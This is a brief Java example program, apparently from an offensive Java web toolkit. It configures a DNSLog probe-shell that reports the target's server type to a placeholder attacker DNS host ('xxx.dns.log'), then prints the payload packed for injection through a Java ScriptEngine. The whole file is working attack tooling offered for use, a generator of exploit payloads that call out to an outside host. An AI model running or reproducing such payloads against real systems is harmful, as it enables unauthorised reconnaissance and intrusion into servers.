package com.reajason.javaweb;

import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.DnsLogConfig;
import com.reajason.javaweb.probe.config.ProbeConfig;

/**
 * @author ReaJason
 * @since 2025/8/13
 */
public class DnsLogProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.DNSLog)
                .probeContent(ProbeContent.Server) // 暂只支持 Server 和 JDK
                .shrink(true)
                .debug(false)
                .build();

        DnsLogConfig dnsLogConfig = DnsLogConfig.builder()
                .host("xxx.dns.log")
                .build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, dnsLogConfig);

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(result.toClassPackerConfig()));
    }
}
